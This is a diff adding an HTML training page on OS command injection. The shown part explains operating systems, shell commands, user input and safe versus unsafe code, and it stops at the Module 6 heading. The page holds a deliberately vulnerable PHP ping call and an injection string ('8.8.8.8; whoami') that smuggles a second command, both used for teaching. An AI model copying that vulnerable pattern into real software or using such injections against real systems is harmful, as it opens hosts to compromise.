@@ -1,0 +1,2504 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OS Command Injection Mastery - Interactive Learning Platform</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #00ff88;
+            --danger: #ff3366;
+            --warning: #ffaa00;
+            --success: #00ff88;
+            --info: #00ccff;
+            --dark: #0a0e27;
+            --darker: #050810;
+            --gray: #1a1f3a;
+            --text: #e0e6ff;
+            --text-dim: #8892b0;
+            --border: #16213e;
+            --shadow: rgba(0, 255, 136, 0.15);
+        }
+
+        body {
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
+            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 100%);
+            color: var(--text);
+            line-height: 1.6;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+
+        /* CONTAINER LAYOUT */
+        .container {
+            display: flex;
+            height: 100vh;
+        }
+
+        /* SIDEBAR */
+        .sidebar {
+            width: 280px;
+            background: var(--dark);
+            border-right: 2px solid var(--primary);
+            overflow-y: auto;
+            padding: 20px 0;
+            box-shadow: inset -10px 0 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .sidebar-header {
+            padding: 20px;
+            border-bottom: 2px solid var(--border);
+            margin-bottom: 20px;
+        }
+
+        .sidebar-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: var(--primary);
+            text-shadow: 0 0 10px rgba(0, 255, 136, 0.3);
+            letter-spacing: 2px;
+        }
+
+        .sidebar-nav {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .nav-item {
+            padding: 12px 20px;
+            cursor: pointer;
+            border-left: 3px solid transparent;
+            transition: all 0.3s ease;
+            color: var(--text-dim);
+            font-size: 13px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .nav-item:hover {
+            border-left-color: var(--primary);
+            color: var(--primary);
+            background: rgba(0, 255, 136, 0.1);
+            padding-left: 24px;
+        }
+
+        .nav-item.active {
+            border-left-color: var(--primary);
+            color: var(--primary);
+            background: rgba(0, 255, 136, 0.15);
+            font-weight: bold;
+            text-shadow: 0 0 10px rgba(0, 255, 136, 0.3);
+        }
+
+        .nav-section {
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid var(--border);
+        }
+
+        .nav-section-title {
+            padding: 8px 20px;
+            font-size: 11px;
+            text-transform: uppercase;
+            color: var(--primary);
+            letter-spacing: 1px;
+            opacity: 0.7;
+        }
+
+        /* MAIN CONTENT */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: linear-gradient(90deg, rgba(0, 255, 136, 0.1) 0%, rgba(0, 204, 255, 0.1) 100%);
+            border-bottom: 2px solid var(--primary);
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-title {
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--primary);
+            text-shadow: 0 0 20px rgba(0, 255, 136, 0.4);
+            letter-spacing: 1px;
+        }
+
+        .header-status {
+            display: flex;
+            gap: 15px;
+            font-size: 12px;
+            color: var(--text-dim);
+        }
+
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--primary);
+            box-shadow: 0 0 10px var(--primary);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* CONTENT AREA */
+        .content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 40px;
+        }
+
+        .module {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .module.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .module-title {
+            font-size: 32px;
+            color: var(--primary);
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
+        }
+
+        .module-subtitle {
+            color: var(--text-dim);
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+
+        /* SECTIONS */
+        .section {
+            background: rgba(26, 31, 58, 0.6);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 25px;
+            margin-bottom: 25px;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+
+        .section:hover {
+            border-color: var(--primary);
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.1), 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+
+        .section-title {
+            font-size: 18px;
+            color: var(--info);
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+        }
+
+        .section-title::before {
+            content: '▶';
+            transition: transform 0.3s ease;
+            color: var(--primary);
+        }
+
+        .section.collapsed .section-title::before {
+            transform: rotate(90deg);
+        }
+
+        .section-content {
+            max-height: 2000px;
+            overflow: hidden;
+            transition: max-height 0.3s ease;
+        }
+
+        .section.collapsed .section-content {
+            max-height: 0;
+        }
+
+        .subsection {
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(0, 255, 136, 0.05);
+            border-left: 3px solid var(--primary);
+            border-radius: 4px;
+        }
+
+        .subsection-title {
+            color: var(--success);
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .code-block {
+            background: var(--darker);
+            border: 1px solid var(--border);
+            padding: 15px;
+            border-radius: 6px;
+            overflow-x: auto;
+            margin: 15px 0;
+            color: var(--primary);
+            font-size: 13px;
+            line-height: 1.8;
+            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .code-label {
+            font-size: 11px;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            margin-bottom: 8px;
+            letter-spacing: 1px;
+        }
+
+        .vulnerable {
+            border-left-color: var(--danger);
+        }
+
+        .vulnerable .code-label {
+            color: var(--danger);
+        }
+
+        .safe {
+            border-left-color: var(--success);
+        }
+
+        .safe .code-label {
+            color: var(--success);
+        }
+
+        /* TERMINAL SIMULATION */
+        .terminal {
+            background: var(--darker);
+            border: 2px solid var(--primary);
+            border-radius: 6px;
+            padding: 20px;
+            margin: 20px 0;
+            font-size: 13px;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.2);
+        }
+
+        .terminal-header {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .terminal-btn {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        .terminal-btn-red { background: #ff5f56; }
+        .terminal-btn-yellow { background: #ffbd2e; }
+        .terminal-btn-green { background: var(--primary); }
+
+        .terminal-title {
+            flex: 1;
+            text-align: center;
+            color: var(--text-dim);
+            font-size: 11px;
+        }
+
+        .terminal-content {
+            color: var(--primary);
+            line-height: 2;
+        }
+
+        .terminal-line {
+            display: flex;
+            gap: 10px;
+            margin: 5px 0;
+        }
+
+        .terminal-prompt {
+            color: var(--primary);
+            font-weight: bold;
+        }
+
+        .terminal-command {
+            color: var(--info);
+        }
+
+        .terminal-output {
+            color: var(--text);
+        }
+
+        .terminal-success {
+            color: var(--success);
+        }
+
+        /* TABLES */
+        .table-container {
+            overflow-x: auto;
+            margin: 20px 0;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: rgba(26, 31, 58, 0.4);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            overflow: hidden;
+        }
+
+        th {
+            background: rgba(0, 255, 136, 0.1);
+            color: var(--primary);
+            padding: 12px;
+            text-align: left;
+            border-bottom: 2px solid var(--primary);
+            font-weight: bold;
+        }
+
+        td {
+            padding: 12px;
+            border-bottom: 1px solid var(--border);
+            color: var(--text);
+        }
+
+        tr:hover {
+            background: rgba(0, 255, 136, 0.05);
+        }
+
+        /* BUTTONS */
+        .btn {
+            display: inline-block;
+            padding: 12px 24px;
+            background: linear-gradient(90deg, var(--primary), var(--success));
+            color: var(--dark);
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn-secondary {
+            background: rgba(0, 255, 136, 0.1);
+            color: var(--primary);
+            border: 2px solid var(--primary);
+        }
+
+        .btn-secondary:hover {
+            background: rgba(0, 255, 136, 0.2);
+        }
+
+        .btn-danger {
+            background: linear-gradient(90deg, var(--danger), #ff5588);
+        }
+
+        .btn-danger:hover {
+            box-shadow: 0 0 30px rgba(255, 51, 102, 0.5);
+        }
+
+        /* INPUT SIMULATOR */
+        .input-group {
+            margin: 20px 0;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .input-label {
+            color: var(--primary);
+            font-size: 13px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .input-field {
+            background: var(--darker);
+            border: 2px solid var(--border);
+            color: var(--primary);
+            padding: 12px;
+            border-radius: 6px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            transition: all 0.3s ease;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
+        }
+
+        /* ALERT BOXES */
+        .alert {
+            padding: 15px;
+            border-radius: 6px;
+            margin: 15px 0;
+            border-left: 4px solid;
+            display: flex;
+            gap: 10px;
+        }
+
+        .alert-info {
+            background: rgba(0, 204, 255, 0.1);
+            border-left-color: var(--info);
+        }
+
+        .alert-warning {
+            background: rgba(255, 170, 0, 0.1);
+            border-left-color: var(--warning);
+        }
+
+        .alert-danger {
+            background: rgba(255, 51, 102, 0.1);
+            border-left-color: var(--danger);
+        }
+
+        .alert-success {
+            background: rgba(0, 255, 136, 0.1);
+            border-left-color: var(--success);
+        }
+
+        .alert-icon {
+            flex-shrink: 0;
+            font-weight: bold;
+            width: 20px;
+            text-align: center;
+        }
+
+        .alert-info .alert-icon { color: var(--info); }
+        .alert-warning .alert-icon { color: var(--warning); }
+        .alert-danger .alert-icon { color: var(--danger); }
+        .alert-success .alert-icon { color: var(--success); }
+
+        /* BURP SUITE SIMULATION */
+        .burp-container {
+            background: var(--darker);
+            border: 2px solid var(--primary);
+            border-radius: 6px;
+            margin: 20px 0;
+            overflow: hidden;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.15);
+        }
+
+        .burp-tabs {
+            display: flex;
+            background: rgba(0, 255, 136, 0.05);
+            border-bottom: 2px solid var(--border);
+        }
+
+        .burp-tab {
+            padding: 12px 20px;
+            cursor: pointer;
+            color: var(--text-dim);
+            border-bottom: 3px solid transparent;
+            transition: all 0.3s ease;
+            font-size: 12px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .burp-tab:hover {
+            color: var(--primary);
+        }
+
+        .burp-tab.active {
+            color: var(--primary);
+            border-bottom-color: var(--primary);
+        }
+
+        .burp-content {
+            padding: 20px;
+            display: none;
+        }
+
+        .burp-content.active {
+            display: block;
+        }
+
+        .request-line {
+            color: var(--info);
+            margin-bottom: 15px;
+            padding: 10px;
+            background: rgba(0, 204, 255, 0.05);
+            border-left: 3px solid var(--info);
+        }
+
+        .header-line {
+            color: var(--text);
+            margin: 5px 0;
+            font-size: 12px;
+        }
+
+        .param-row {
+            display: flex;
+            gap: 10px;
+            margin: 8px 0;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 4px;
+        }
+
+        .param-key {
+            color: var(--warning);
+            font-weight: bold;
+            min-width: 100px;
+        }
+
+        .param-value {
+            color: var(--text);
+            flex: 1;
+            word-break: break-all;
+        }
+
+        .param-value.injected {
+            color: var(--danger);
+            background: rgba(255, 51, 102, 0.1);
+            padding: 5px;
+            border-radius: 3px;
+        }
+
+        /* QUIZ */
+        .quiz-container {
+            margin: 20px 0;
+        }
+
+        .quiz-question {
+            margin: 15px 0;
+            padding: 15px;
+            background: rgba(26, 31, 58, 0.5);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+        }
+
+        .quiz-question-text {
+            color: var(--info);
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+
+        .quiz-option {
+            padding: 10px 15px;
+            margin: 8px 0;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .quiz-option:hover {
+            background: rgba(0, 255, 136, 0.1);
+            border-color: var(--primary);
+        }
+
+        .quiz-option input {
+            cursor: pointer;
+        }
+
+        .quiz-option.correct {
+            background: rgba(0, 255, 136, 0.2);
+            border-color: var(--success);
+        }
+
+        .quiz-option.incorrect {
+            background: rgba(255, 51, 102, 0.2);
+            border-color: var(--danger);
+        }
+
+        .quiz-feedback {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+
+        .quiz-feedback.correct {
+            background: rgba(0, 255, 136, 0.1);
+            color: var(--success);
+        }
+
+        .quiz-feedback.incorrect {
+            background: rgba(255, 51, 102, 0.1);
+            color: var(--danger);
+        }
+
+        /* VISUAL FLOW DIAGRAM */
+        .flow-diagram {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            margin: 30px 0;
+            padding: 20px;
+            background: rgba(0, 255, 136, 0.05);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+        }
+
+        .flow-box {
+            text-align: center;
+            padding: 15px;
+            background: var(--darker);
+            border: 2px solid var(--primary);
+            border-radius: 6px;
+            min-width: 120px;
+            color: var(--primary);
+            font-weight: bold;
+        }
+
+        .flow-arrow {
+            color: var(--primary);
+            font-size: 24px;
+        }
+
+        /* SCROLLBAR */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--darker);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--info);
+        }
+
+        /* RESPONSIVE */
+        @media (max-width: 1024px) {
+            .sidebar {
+                width: 220px;
+            }
+
+            .content {
+                padding: 25px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+            }
+
+            .sidebar {
+                width: 100%;
+                height: auto;
+                border-right: none;
+                border-bottom: 2px solid var(--primary);
+            }
+
+            .sidebar-nav {
+                flex-direction: row;
+                flex-wrap: wrap;
+            }
+
+            .nav-item {
+                flex: 1;
+                min-width: 120px;
+            }
+
+            .header {
+                padding: 15px 20px;
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .flow-diagram {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .flow-arrow {
+                transform: rotate(90deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- SIDEBAR -->
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <div class="sidebar-title">🛡️ CMD INJECTION</div>
+            </div>
+            <div class="sidebar-nav">
+                <div class="nav-item active" onclick="showModule(0)">📖 Module 1: OS Basics</div>
+                <div class="nav-item" onclick="showModule(1)">📖 Module 2: OS Commands</div>
+                <div class="nav-item" onclick="showModule(2)">📖 Module 3: Web Apps & OS</div>
+                <div class="nav-item" onclick="showModule(3)">📖 Module 4: User Input</div>
+                <div class="nav-item" onclick="showModule(4)">📖 Module 5: Safe vs Unsafe</div>
+                
+                <div class="nav-section">
+                    <div class="nav-section-title">🔥 Exploitation</div>
+                </div>
+                <div class="nav-item" onclick="showModule(5)">📖 Module 6: What is Injection?</div>
+                <div class="nav-item" onclick="showModule(6)">📖 Module 7: Why It Works</div>
+                
+                <div class="nav-section">
+                    <div class="nav-section-title">🧪 Labs</div>
+                </div>
+                <div class="nav-item" onclick="showModule(7)">🔴 Lab 1: Visible Injection</div>
+                <div class="nav-item" onclick="showModule(8)">🟠 Lab 2: Blind with Delay</div>
+                <div class="nav-item" onclick="showModule(9)">🟡 Lab 3: Output Redirect</div>
+                <div class="nav-item" onclick="showModule(10)">🔴 Lab 4: DVWA RCE</div>
+                
+                <div class="nav-section">
+                    <div class="nav-section-title">🎓 Final</div>
+                </div>
+                <div class="nav-item" onclick="showModule(11)">❓ Quiz & Summary</div>
+            </div>
+        </div>
+
+        <!-- MAIN CONTENT -->
+        <div class="main-content">
+            <!-- HEADER -->
+            <div class="header">
+                <div class="header-title">OS Command Injection Mastery</div>
+                <div class="header-status">
+                    <div class="status-item">
+                        <div class="status-dot"></div>
+                        <span>Learning Mode</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- CONTENT -->
+            <div class="content">
+
+                <!-- MODULE 1 -->
+                <div class="module active">
+                    <h1 class="module-title">🌍 What Is an Operating System?</h1>
+                    <p class="module-subtitle">Understanding the foundation of command execution</p>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">💡 Core Definition</div>
+                        <div class="section-content">
+                            <p style="margin: 10px 0;">An Operating System (OS) is system software that:</p>
+                            <div class="subsection">
+                                <div class="subsection-title">• Manages hardware resources (CPU, memory, disk)</div>
+                                <div class="subsection-title">• Executes programs and processes</div>
+                                <div class="subsection-title">• Processes commands from users and applications</div>
+                                <div class="subsection-title">• Provides security boundaries (users, permissions)</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🖥️ Common Operating Systems</div>
+                        <div class="section-content">
+                            <div class="table-container">
+                                <table>
+                                    <tr>
+                                        <th>OS</th>
+                                        <th>Type</th>
+                                        <th>Command Line</th>
+                                        <th>Example</th>
+                                    </tr>
+                                    <tr>
+                                        <td>Linux</td>
+                                        <td>Unix-based</td>
+                                        <td>Bash/Shell</td>
+                                        <td>$ whoami</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Windows</td>
+                                        <td>Proprietary</td>
+                                        <td>CMD/PowerShell</td>
+                                        <td>> whoami</td>
+                                    </tr>
+                                    <tr>
+                                        <td>macOS</td>
+                                        <td>Unix-based</td>
+                                        <td>Bash/Zsh</td>
+                                        <td>$ whoami</td>
+                                    </tr>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🔄 Visual Flow</div>
+                        <div class="section-content">
+                            <div class="flow-diagram">
+                                <div class="flow-box">User</div>
+                                <div class="flow-arrow">→</div>
+                                <div class="flow-box">Command</div>
+                                <div class="flow-arrow">→</div>
+                                <div class="flow-box">OS</div>
+                                <div class="flow-arrow">→</div>
+                                <div class="flow-box">Output</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="alert alert-info">
+                        <div class="alert-icon">ℹ️</div>
+                        <div>The OS is the gatekeeper between users/applications and hardware. Commands it executes run with the privileges of the user or service.</div>
+                    </div>
+                </div>
+
+                <!-- MODULE 2 -->
+                <div class="module">
+                    <h1 class="module-title">📝 What Is an OS Command?</h1>
+                    <p class="module-subtitle">Commands are instructions that directly interact with your system</p>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">💡 Definition</div>
+                        <div class="section-content">
+                            <p style="margin: 10px 0;">An OS command is an instruction given to the operating system to perform a specific task.</p>
+                            <div class="alert alert-success">
+                                <div class="alert-icon">✓</div>
+                                <div><strong>Core Principle:</strong> OS commands directly interact with the system and have high privileges.</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🐧 Common Linux Commands</div>
+                        <div class="section-content">
+                            <div class="code-block">
+ls           # List files in directory
+pwd          # Print working directory
+whoami       # Show current user
+cat file.txt # Display file contents
+id           # Show user/group IDs
+uname -a     # Show system information
+ps aux       # List running processes
+                            </div>
+                            <p style="margin: 15px 0; color: var(--text-dim);">Each command performs a specific function and requires certain privileges to execute.</p>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🧪 Live Command Simulator</div>
+                        <div class="section-content">
+                            <div class="input-group">
+                                <label class="input-label">Enter a command:</label>
+                                <input class="input-field" id="cmd1" type="text" placeholder="E.g., whoami">
+                                <button class="btn" onclick="simulateCommand('cmd1', 'output1')">Execute</button>
+                            </div>
+                            <div id="output1" class="terminal" style="display: none;">
+                                <div class="terminal-header">
+                                    <div class="terminal-btn terminal-btn-red"></div>
+                                    <div class="terminal-btn terminal-btn-yellow"></div>
+                                    <div class="terminal-btn terminal-btn-green"></div>
+                                    <div class="terminal-title">$ bash</div>
+                                </div>
+                                <div class="terminal-content" id="output1-content"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- MODULE 3 -->
+                <div class="module">
+                    <h1 class="module-title">🌐 How Web Apps Use OS Commands</h1>
+                    <p class="module-subtitle">Understanding the connection between web applications and operating systems</p>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">❓ Why Do Web Apps Need OS Commands?</div>
+                        <div class="section-content">
+                            <div class="subsection">
+                                <div class="subsection-title">📌 Common Scenarios:</div>
+                                <p>• Ping a server to check connectivity</p>
+                                <p>• Resize or convert images</p>
+                                <p>• Convert file formats (PDF, video)</p>
+                                <p>• Check system status or resources</p>
+                                <p>• Run external tools/scripts</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">💻 Code Example</div>
+                        <div class="section-content">
+                            <div class="code-block" style="color: var(--info);">
+<span style="color: var(--primary);">// PHP Example</span>
+<span style="color: var(--text);">$ip = $_GET['ip'];  </span><span style="color: var(--text-dim);">// Get user input</span>
+<span style="color: var(--warning);">system</span>(<span style="color: var(--success);">"ping -c 1 " . $ip</span>);  <span style="color: var(--text-dim);">// Execute OS command</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🔄 Internal Flow</div>
+                        <div class="section-content">
+                            <div class="flow-diagram">
+                                <div class="flow-box">User Request</div>
+                                <div class="flow-arrow">→</div>
+                                <div class="flow-box">Web App</div>
+                                <div class="flow-arrow">→</div>
+                                <div class="flow-box">OS</div>
+                                <div class="flow-arrow">→</div>
+                                <div class="flow-box">Response</div>
+                            </div>
+                            <div style="margin-top: 20px; color: var(--text-dim); font-size: 12px;">
+                                <strong>Step 1:</strong> Web app receives user request<br>
+                                <strong>Step 2:</strong> App processes request and builds OS command<br>
+                                <strong>Step 3:</strong> Command sent to operating system<br>
+                                <strong>Step 4:</strong> OS executes command with app privileges<br>
+                                <strong>Step 5:</strong> Output returned to application<br>
+                                <strong>Step 6:</strong> App sends response back to user
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="alert alert-warning">
+                        <div class="alert-icon">⚠️</div>
+                        <div><strong>Critical Point:</strong> The OS executes commands with the privileges of the web application user (often "www-data" or similar).</div>
+                    </div>
+                </div>
+
+                <!-- MODULE 4 -->
+                <div class="module">
+                    <h1 class="module-title">👤 What Is User Input?</h1>
+                    <p class="module-subtitle">Identifying where attackers inject data</p>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">💡 Definition</div>
+                        <div class="section-content">
+                            <p>User input is any data that comes from the user and reaches the application.</p>
+                            <div class="subsection">
+                                <div class="subsection-title">🎯 Sources of User Input:</div>
+                                <p>• <strong>URL Parameters:</strong> ?ip=8.8.8.8</p>
+                                <p>• <strong>Form Inputs:</strong> Text fields, dropdowns, checkboxes</p>
+                                <p>• <strong>HTTP Headers:</strong> User-Agent, X-Forwarded-For</p>
+                                <p>• <strong>Cookies:</strong> Session tokens, preferences</p>
+                                <p>• <strong>File Uploads:</strong> Filenames, contents</p>
+                                <p>• <strong>API Requests:</strong> JSON, XML payloads</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🔗 Example URL</div>
+                        <div class="section-content">
+                            <div class="code-block">
+http://example.com/api/ping?ip=8.8.8.8&timeout=5
+
+Parameters:
+  ip      = 8.8.8.8    ← User controlled
+  timeout = 5          ← User controlled
+                            </div>
+                            <p style="margin: 15px 0; color: var(--text-dim);">All parameters shown above are supplied by the user and often used directly in OS commands.</p>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🧪 Input Journey Simulator</div>
+                        <div class="section-content">
+                            <div class="input-group">
+                                <label class="input-label">Simulate user input (enter an IP):</label>
+                                <input class="input-field" id="input-sim" type="text" placeholder="E.g., 192.168.1.1">
+                                <button class="btn" onclick="simulateInputJourney()">Trace Path</button>
+                            </div>
+                            <div id="journey-output" style="margin-top: 20px; display: none;">
+                                <div class="terminal">
+                                    <div class="terminal-header">
+                                        <div class="terminal-btn terminal-btn-red"></div>
+                                        <div class="terminal-btn terminal-btn-yellow"></div>
+                                        <div class="terminal-btn terminal-btn-green"></div>
+                                        <div class="terminal-title">$ trace input</div>
+                                    </div>
+                                    <div class="terminal-content">
+                                        <div class="terminal-line">
+                                            <span class="terminal-prompt">→</span>
+                                            <span class="terminal-output">User enters: <span style="color: var(--warning);" id="journey-input"></span></span>
+                                        </div>
+                                        <div class="terminal-line">
+                                            <span class="terminal-prompt">→</span>
+                                            <span class="terminal-output">Browser sends to: /api/ping?ip=<span style="color: var(--warning);" id="journey-param"></span></span>
+                                        </div>
+                                        <div class="terminal-line">
+                                            <span class="terminal-prompt">→</span>
+                                            <span class="terminal-output">App receives: $_GET['ip'] = <span style="color: var(--warning);" id="journey-var"></span></span>
+                                        </div>
+                                        <div class="terminal-line">
+                                            <span class="terminal-prompt">→</span>
+                                            <span class="terminal-output">App constructs: system("ping " . <span style="color: var(--warning);" id="journey-construct"></span>)</span>
+                                        </div>
+                                        <div class="terminal-line">
+                                            <span class="terminal-prompt">→</span>
+                                            <span class="terminal-output">OS executes: ping <span style="color: var(--warning);" id="journey-os"></span></span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="alert alert-danger">
+                        <div class="alert-icon">⚠️</div>
+                        <div><strong>Critical:</strong> User input can come from many sources. If ANY of it reaches an OS command without validation, attackers can exploit it.</div>
+                    </div>
+                </div>
+
+                <!-- MODULE 5 -->
+                <div class="module">
+                    <h1 class="module-title">🛡️ Safe vs Unsafe Code</h1>
+                    <p class="module-subtitle">Understanding secure and vulnerable patterns</p>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">❌ Vulnerable Code Pattern</div>
+                        <div class="section-content">
+                            <div class="code-block vulnerable">
+                                <div class="code-label">❌ VULNERABLE</div>
+$ip = $_GET['ip'];
+system("ping -c 1 " . $ip);
+                            </div>
+                            <div class="alert alert-danger">
+                                <div class="alert-icon">✗</div>
+                                <div>
+                                    <strong>Why is this vulnerable?</strong><br>
+                                    • No input validation<br>
+                                    • User input directly concatenated<br>
+                                    • Shell interprets special characters<br>
+                                    • Attacker has full control
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">✅ Safe Code Patterns</div>
+                        <div class="section-content">
+                            <div class="code-block safe">
+                                <div class="code-label">✅ SAFE - Escape Shell Args (PHP)</div>
+$ip = escapeshellarg($_GET['ip']);
+system("ping -c 1 " . $ip);
+                            </div>
+
+                            <div class="code-block safe" style="margin-top: 20px;">
+                                <div class="code-label">✅ SAFE - Argument Array (Python)</div>
+import subprocess
+ip = request.args.get('ip')
+subprocess.run(['ping', '-c', '1', ip])
+                            </div>
+
+                            <div class="code-block safe" style="margin-top: 20px;">
+                                <div class="code-label">✅ SAFE - Whitelist Validation (General)</div>
+ip = request.args.get('ip')
+if re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
+    system("ping -c 1 " + ip)
+else:
+    error("Invalid IP format")
+                            </div>
+
+                            <div class="alert alert-success">
+                                <div class="alert-icon">✓</div>
+                                <div>
+                                    <strong>Safe coding principles:</strong><br>
+                                    • Escape shell arguments<br>
+                                    • Use parameterized commands<br>
+                                    • Validate input format<br>
+                                    • Whitelist expected values<br>
+                                    • Avoid shell execution when possible
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🧪 Vulnerability Simulator</div>
+                        <div class="section-content">
+                            <div class="input-group">
+                                <label class="input-label">Test Safe vs Unsafe Code:</label>
+                                <input class="input-field" id="safety-test" type="text" placeholder="Enter input (try: 8.8.8.8 or 8.8.8.8; whoami)" value="8.8.8.8">
+                                <button class="btn" onclick="testSafeUnsafe()">Test Both</button>
+                            </div>
+                            <div id="safety-results" style="margin-top: 20px; display: none;">
+                                <div style="margin-bottom: 20px;">
+                                    <h4 style="color: var(--danger); margin-bottom: 10px;">❌ UNSAFE CODE</h4>
+                                    <div class="terminal">
+                                        <div class="terminal-content" id="unsafe-output"></div>
+                                    </div>
+                                </div>
+                                <div>
+                                    <h4 style="color: var(--success); margin-bottom: 10px;">✅ SAFE CODE</h4>
+                                    <div class="terminal">
+                                        <div class="terminal-content" id="safe-output"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- MODULE 6 -->
+                <div class="module">
+                    <h1 class="module-title">💀 What Is OS Command Injection?</h1>
